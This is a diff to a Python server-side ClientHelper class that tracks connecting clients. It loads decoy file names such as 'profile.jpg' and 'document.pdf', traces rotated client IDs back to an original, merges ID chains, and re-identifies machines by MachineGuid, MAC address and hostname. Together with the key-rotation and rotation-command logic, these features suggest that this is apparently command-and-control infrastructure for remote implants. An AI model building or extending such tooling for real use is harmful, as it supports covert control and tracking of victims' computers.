@@ -10,7 +10,8 @@ import random
 logger = logging.getLogger(__name__)
 
 class ClientHelper:
-    """Handles client identification, verification, and command management"""
+    # Class variable to store client names across all instances
+    _client_names = None
     
     def __init__(self, client_manager, crypto_helper, server):
         self.client_manager = client_manager
@@ -19,32 +20,38 @@ class ClientHelper:
         self._load_client_names()
     
     def _load_client_names(self):
-        """Load possible client names from client_names.txt file"""
-        self.client_names = ["default-img.jpeg"]  # Fallback default
-        
-        try:
-            # Find the client_names.txt file path
-            script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-            names_file = os.path.join(script_dir, "helpers", "links", "client_names.txt")
+        """Load possible client names from client_names.txt file once"""
+        # Only load if the class variable is None
+        if ClientHelper._client_names is None:
+            # Set default fallback
+            ClientHelper._client_names = ["default-img.jpeg"]
             
-            if os.path.exists(names_file):
-                with open(names_file, 'r') as f:
-                    names = [line.strip() for line in f if line.strip()]
+            try:
+                # Find the client_names.txt file path
+                script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+                names_file = os.path.join(script_dir, "helpers", "links", "client_names.txt")
                 
-                if names:
-                    self.client_names = names
-                    logger.info(f"Loaded {len(names)} client names from {names_file}")
+                if os.path.exists(names_file):
+                    with open(names_file, 'r') as f:
+                        names = [line.strip() for line in f if line.strip()]
+                    
+                    if names:
+                        ClientHelper._client_names = names
+                        logger.info(f"Loaded {len(names)} client names from {names_file}")
+                    else:
+                        logger.warning(f"No client names found in {names_file}, using defaults")
                 else:
-                    logger.warning(f"No client names found in {names_file}, using defaults")
-            else:
-                logger.warning(f"Client names file not found at {names_file}, using defaults")
-                # Create some default options
-                self.client_names = [
-                    "profile.jpg", "document.pdf", "config.json", "data.csv", 
-                    "script.js", "style.css", "image.png", "icon.ico"
-                ]
-        except Exception as e:
-            logger.error(f"Error loading client names: {e}")
+                    logger.warning(f"Client names file not found at {names_file}, using defaults")
+                    # Create some default options
+                    ClientHelper._client_names = [
+                        "profile.jpg", "document.pdf", "config.json", "data.csv", 
+                        "script.js", "style.css", "image.png", "icon.ico"
+                    ]
+            except Exception as e:
+                logger.error(f"Error loading client names: {e}")
+        
+        # Use the class variable
+        self.client_names = ClientHelper._client_names
     
     def identify_client_from_body(self, client_ip, client_id_from_body, system_info_raw=None):
         """
@@ -120,31 +127,59 @@ class ClientHelper:
                         reported_original_id = system_info_obj.get('OriginalClientId')
                         logger.info(f"Client reported original ID: {reported_original_id}")
                         
-                        # This is a rotated client ID. Use the original for internal tracking.
-                        if reported_original_id in self.client_manager.get_clients_info():
-                            # Update the client info with the current ID
-                            client_info = self.client_manager.get_clients_info()[reported_original_id]
+                        # Get the first in the chain (true original)
+                        true_original_id = self.find_true_original_id(reported_original_id)
+                        if true_original_id and true_original_id in self.client_manager.clients:
+                            # Use the true original ID for tracking
+                            original_client_id = true_original_id
+                            logger.info(f"Using true original client ID for tracking: {original_client_id}")
                             
-                            # Update the client's current ID in our tracking
-                            self.client_manager.update_client_id_mapping(reported_original_id, client_id)
+                            # Update the client's current ID in our tracking if needed
+                            if client_id != reported_original_id and client_id != original_client_id:
+                                # Check if we already have a mapping chain that includes this client
+                                existing_chain = self.check_existing_chain(client_id)
+                                if existing_chain and existing_chain != original_client_id:
+                                    # We need to merge two chains - this client belongs to existing_chain
+                                    # but now we discovered it's also related to original_client_id
+                                    self.merge_client_chains(existing_chain, original_client_id)
+                                else:
+                                    # Update the client ID mapping, ensuring all IDs point to the original
+                                    self.client_manager.update_client_id_mapping(original_client_id, client_id)
                             
-                            # Use original ID for internal tracking
+                        elif reported_original_id in self.client_manager.clients:
+                            # We couldn't find a true original, but the reported original exists
                             original_client_id = reported_original_id
-                            logger.info(f"Using original client ID for internal tracking: {original_client_id}")
+                            logger.info(f"Using reported original client ID for tracking: {original_client_id}")
+                            
+                            # Update the mapping if needed
+                            if client_id != reported_original_id:
+                                self.client_manager.update_client_id_mapping(reported_original_id, client_id)
                         else:
-                            logger.warning(f"Original client ID {reported_original_id} not found in client manager")
+                            logger.warning(f"Reported original client ID {reported_original_id} not found in client manager")
+                            # Keep using the current ID
                 except Exception as e:
                     logger.error(f"Error parsing system info: {str(e)}")
                     # Keep client_id but use minimal system info
                     system_info = {"Hostname": "Unknown", "IP": client_ip}
                 
                 # Check if this is a known client via the current ID
-                if client_id in self.client_manager.get_clients_info():
+                if client_id in self.client_manager.clients:
                     logger.info(f"Recognized client by current ID {client_id} from {client_ip}")
-                    original_client_id = client_id  # This is likely the original ID
+                    
+                    # Check if this client has an original ID recorded
+                    if "original_client_id" in self.client_manager.clients[client_id]:
+                        # Use the recorded original ID for tracking
+                        recorded_original_id = self.client_manager.clients[client_id]["original_client_id"]
+                        
+                        # Find the true original ID by tracing the chain
+                        true_original_id = self.find_true_original_id(recorded_original_id)
+                        
+                        if true_original_id and true_original_id in self.client_manager.clients:
+                            original_client_id = true_original_id
+                            logger.info(f"Using true original client ID for internal tracking: {original_client_id}")
                     
                     # Check if this client needs a key
-                    if not self._has_unique_key(client_id):
+                    if not self._has_unique_key(client_id) and not self._has_unique_key(original_client_id):
                         first_contact = True
                 
                 # Check if we need to find the client by a rotated ID mapping
@@ -155,9 +190,26 @@ class ClientHelper:
                     if not self._has_unique_key(original_client_id):
                         first_contact = True
                 else:
-                    newly_identified = True
-                    first_contact = True
-                    logger.info(f"New client with ID {client_id} from {client_ip}")
+                    # Check if this is a previously known client that's reconnecting with a new ID
+                    # by using machine identifiers like hostname, IP, etc.
+                    possible_match = self.find_client_by_identifiers(system_info)
+                    
+                    if possible_match:
+                        # Found a matching client based on system info
+                        original_client_id = possible_match
+                        logger.info(f"Identified client as returning client {possible_match} based on system identifiers")
+                        
+                        # Update the mapping to include this new ID
+                        self.client_manager.update_client_id_mapping(original_client_id, client_id)
+                        
+                        # Check if key rotation is needed
+                        if not self._has_unique_key(original_client_id):
+                            first_contact = True
+                    else:
+                        # Truly new client
+                        newly_identified = True
+                        first_contact = True
+                        logger.info(f"New client with ID {client_id} from {client_ip}")
             except Exception as e:
                 logger.error(f"Error processing system information: {str(e)}")
                 # Use client_id from body but minimal system info
@@ -176,6 +228,169 @@ class ClientHelper:
         )
         
         return original_client_id, system_info, newly_identified, first_contact
+    
+    def find_true_original_id(self, client_id):
+        """
+        Recursively trace back through the client ID chain to find the first original ID
+        
+        Args:
+            client_id: The client ID to start the search from
+            
+        Returns:
+            The true original client ID or None if not found
+        """
+        if not client_id or client_id not in self.client_manager.clients:
+            return client_id  # Return the input if it's not in our database
+                
+        visited_ids = set()  # To detect cycles
+        current_id = client_id
+        
+        # Limit the chain depth to prevent infinite loops
+        max_depth = 10
+        depth = 0
+        
+        while current_id and current_id in self.client_manager.clients and depth < max_depth:
+            depth += 1
+            
+            # Check for cycles
+            if current_id in visited_ids:
+                logger.warning(f"Detected cycle in client ID chain starting with {client_id}")
+                break
+                    
+            visited_ids.add(current_id)
+            
+            # Get the recorded original ID for this client
+            original_id = self.client_manager.clients[current_id].get("original_client_id")
+            
+            # If it's the same as current or not set, we've reached the start of the chain
+            if not original_id or original_id == current_id:
+                return current_id
+                    
+            # Continue tracing back
+            current_id = original_id
+                
+        # Return the last valid ID in the chain
+        return current_id  # This is either the original ID or the last valid one we found
+    
+    def check_existing_chain(self, client_id):
+        """
+        Check if this client ID is already part of a chain
+        
+        Args:
+            client_id: The client ID to check
+            
+        Returns:
+            The true original ID of the chain this client belongs to, or None
+        """
+        if not client_id or client_id not in self.client_manager.clients:
+            return None
+            
+        # If this client has an original_client_id set, it's already part of a chain
+        if "original_client_id" in self.client_manager.clients[client_id]:
+            original_id = self.client_manager.clients[client_id].get("original_client_id")
+            if original_id and original_id != client_id:
+                # Find the true original by tracing back
+                return self.find_true_original_id(original_id)
+                
+        # Check if this client is itself an original for any other clients
+        for cid, info in self.client_manager.clients.items():
+            if info.get("original_client_id") == client_id and cid != client_id:
+                # This client is an original for other clients
+                return client_id
+                
+        return None
+    
+    def merge_client_chains(self, chain1_id, chain2_id):
+        """
+        Merge two client ID chains by making all clients in chain2 point to the original of chain1
+        
+        Args:
+            chain1_id: The true original ID of the first chain
+            chain2_id: The true original ID of the second chain
+        """
+        if chain1_id == chain2_id:
+            return  # Nothing to merge
+            
+        # Find all clients that are part of chain2
+        chain2_clients = []
+        for cid, info in self.client_manager.clients.items():
+            if info.get("original_client_id") == chain2_id or cid == chain2_id:
+                chain2_clients.append(cid)
+                
+        # Update all chain2 clients to point to chain1
+        for cid in chain2_clients:
+            if cid != chain1_id:  # Don't point to itself
+                self.client_manager.clients[cid]["original_client_id"] = chain1_id
+                logger.info(f"Merged client chain: {cid} now points to {chain1_id} (was in chain of {chain2_id})")
+        
+        # Update any client that was pointing to chain2_id to point to chain1_id
+        for cid, info in self.client_manager.clients.items():
+            if info.get("original_client_id") == chain2_id:
+                info["original_client_id"] = chain1_id
+                logger.info(f"Updated client {cid} to point to merged chain original {chain1_id}")
+        
+        # Mark chain2 as part of chain1
+        if chain2_id in self.client_manager.clients:
+            self.client_manager.clients[chain2_id]["original_client_id"] = chain1_id
+            logger.info(f"Chain original {chain2_id} now points to primary chain original {chain1_id}")
+    
+    def find_client_by_identifiers(self, system_info):
+        """
+        Find a client based on system identifiers like machine GUID, hostname, etc.
+        
+        Args:
+            system_info: Dictionary of system information
+            
+        Returns:
+            The client ID of a matching client, or None if no match found
+        """
+        if not system_info:
+            return None
+            
+        # Extract key identifiers
+        hostname = system_info.get("Hostname", "Unknown")
+        ip = system_info.get("IP", "Unknown")
+        mac_address = system_info.get("MacAddress", "Unknown")
+        machine_guid = system_info.get("MachineGuid", "Unknown")
+        
+        # Skip if we don't have enough identifiers
+        if hostname == "Unknown" and ip == "Unknown" and mac_address == "Unknown" and machine_guid == "Unknown":
+            return None
+            
+        # Check each client for matching identifiers
+        best_match = None
+        best_match_score = 0
+        
+        for client_id, info in self.client_manager.clients.items():
+            score = 0
+            client_system_info = info.get("system_info", {})
+            
+            # Check Machine GUID (strongest identifier)
+            if machine_guid != "Unknown" and machine_guid == client_system_info.get("MachineGuid"):
+                score += 10
+                
+            # Check MAC address (strong identifier)
+            if mac_address != "Unknown" and mac_address == client_system_info.get("MacAddress"):
+                score += 5
+                
+            # Check hostname (moderately strong identifier)
+            if hostname != "Unknown" and hostname == client_system_info.get("Hostname"):
+                score += 3
+                
+            # Check IP (weakest identifier as it can change)
+            if ip != "Unknown" and ip == info.get("ip"):
+                score += 1
+                
+            # If this is a better match than previous
+            if score > best_match_score:
+                best_match_score = score
+                best_match = client_id
+                
+        # Only return if we have a reasonably good match
+        if best_match_score >= 5:  # Require at least MAC address match or better
+            return self.find_true_original_id(best_match)
+            
+        return None
     
     def verify_client(self, client_id, system_info):
         """
@@ -387,7 +602,7 @@ class ClientHelper:
             # If previous rotation commands were sent but not applied, create a new rotation
             if (client_info.get('rotation_commands_sent', 0) > 0 and 
                 (not client_info.get('current_client_id') or 
-                client_info.get('current_client_id') == client_id)):
+                 client_info.get('current_client_id') == client_id)):
                 logger.info(f"Previous rotation for {client_id} seems to have failed, preparing new rotation")
                 
                 # Create a fresh rotation command
